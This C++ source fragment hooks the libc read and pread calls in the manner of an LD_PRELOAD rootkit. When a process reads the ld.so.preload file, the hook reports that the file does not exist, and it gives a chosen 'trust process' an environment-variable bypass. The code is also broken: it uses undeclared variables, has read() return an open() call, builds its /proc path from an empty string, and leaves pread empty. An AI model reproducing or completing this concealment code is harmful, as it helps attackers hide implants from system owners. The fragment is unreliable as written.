
#include "main.h"



ssize_t read (int fd, void *buf, size_t count) {
	istringstream issCnv;
	std::string lnkAim;
	CErrnoSaver serr;
	OPEN opnPtr = (OPEN)dlsym (RTLD_NEXT, "open");
	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
	char chArr[2];
	int ret;
	

	assert (opnPtr != NULL);
	assert (rdPtr != NULL);

	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
		return opnPtr (pathname, flags, mode);
	}
	
	issCnv << fd;
	lnkAim = readLinkName (("/proc/self/fd/" + lnkAim).c_str ());
	
	if (lnkAim == prelFileName) {
		descr_holder fd (new int (-1));
		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR, 0);
		lockAllFile (*fd);
		
		// we can't read our file and by default think that ld.so.preload is absent
		while ((ret = rdPtr (*fd, chArr, 2)) == -1 && errno == EINTR);
		if (ret == -1) {
			serr.set (ENOENT);
			return -1;
		}
		
	}
	
	
	return 0;
}

ssize_t pread (int fd, void *buf, size_t count, off_t offset) {
	istringstream issCnv;
	std::string lnkAim;
	
	
	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
		return opnPtr (pathname, flags, mode);
	}
	
	issCnv << fd;
	lnkAim = readLinkName (("/proc/self/fd/" + lnkAim).c_str ());
	
	if (lnkAim == prelFileName) {
		
		
		
	}
	
	
	return 0;
}








